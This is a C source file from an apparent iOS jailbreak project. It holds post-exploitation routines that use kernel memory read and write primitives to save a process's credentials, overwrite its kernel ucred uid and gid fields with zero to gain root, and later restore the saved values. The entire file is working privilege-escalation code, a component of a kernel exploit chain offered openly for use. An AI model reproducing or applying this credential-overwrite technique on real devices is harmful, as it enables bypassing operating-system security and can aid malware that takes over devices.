//
//  root.c
//  sefebreak
//
//  Created by Xavier Perarnau on 03/02/2019.
//  Copyright © 2019 Xavier Perarnau. All rights reserved.
//

#include "root.h"
#include "kernel_memory.h"
#include "post-common.h"
#include "offsetof.h"

uint32_t p_uid = 0;
uint32_t p_ruid = 0;
uint32_t p_gid = 0;
uint32_t p_rgid = 0;
    
uint32_t ucred_cr_uid = 0;
uint32_t ucred_cr_ruid = 0;
uint32_t ucred_cr_svuid = 0;
uint32_t ucred_cr_ngroups = 1;
uint32_t ucred_cr_groups = 0;
uint32_t ucred_cr_rgid = 0;
uint32_t ucred_cr_svgid = 0;

void save_proc_user_struct(uint64_t task) {
    uint64_t ucred = kernel_get_ucred_for_task(task);
    
    p_uid = kernel_read32(ucred + off_p_uid);
    p_ruid = kernel_read32(ucred + off_p_ruid);
    p_gid = kernel_read32(ucred + off_p_gid);
    p_rgid = kernel_read32(ucred + off_p_rgid);
    
    ucred_cr_uid = kernel_read32(ucred + off_ucred_cr_uid);
    ucred_cr_ruid = kernel_read32(ucred + off_ucred_cr_ruid);
    ucred_cr_svuid = kernel_read32(ucred + off_ucred_cr_svuid);
    ucred_cr_ngroups = kernel_read32(ucred + off_ucred_cr_ngroups);
    ucred_cr_groups = kernel_read32(ucred + off_ucred_cr_groups);
    ucred_cr_rgid = kernel_read32(ucred + off_ucred_cr_rgid);
    ucred_cr_svgid = kernel_read32(ucred + off_ucred_cr_svgid);
}

void root(uint64_t task) {
    uint64_t ucred = kernel_get_ucred_for_task(task);
    
    kernel_write32(ucred + off_p_uid, 0);
    kernel_write32(ucred + off_p_ruid, 0);
    kernel_write32(ucred + off_p_gid, 0);
    kernel_write32(ucred + off_p_rgid, 0);
    
    kernel_write32(ucred + off_ucred_cr_uid, 0);
    kernel_write32(ucred + off_ucred_cr_ruid, 0);
    kernel_write32(ucred + off_ucred_cr_svuid, 0);
    kernel_write32(ucred + off_ucred_cr_ngroups, 1);
    kernel_write32(ucred + off_ucred_cr_groups, 0);
    kernel_write32(ucred + off_ucred_cr_rgid, 0);
    kernel_write32(ucred + off_ucred_cr_svgid, 0);
}

void unroot(uint64_t task) {
    uint64_t ucred = kernel_get_ucred_for_task(task);
    
    kernel_write32(ucred + off_p_uid, p_uid);
    kernel_write32(ucred + off_p_ruid, p_ruid);
    kernel_write32(ucred + off_p_gid, p_gid);
    kernel_write32(ucred + off_p_rgid, p_rgid);
    
    kernel_write32(ucred + off_ucred_cr_uid, ucred_cr_uid);
    kernel_write32(ucred + off_ucred_cr_ruid, ucred_cr_ruid);
    kernel_write32(ucred + off_ucred_cr_svuid, ucred_cr_svuid);
    kernel_write32(ucred + off_ucred_cr_ngroups, ucred_cr_ngroups);
    kernel_write32(ucred + off_ucred_cr_groups, ucred_cr_groups);
    kernel_write32(ucred + off_ucred_cr_rgid, ucred_cr_rgid);
    kernel_write32(ucred + off_ucred_cr_svgid, ucred_cr_svgid);
}


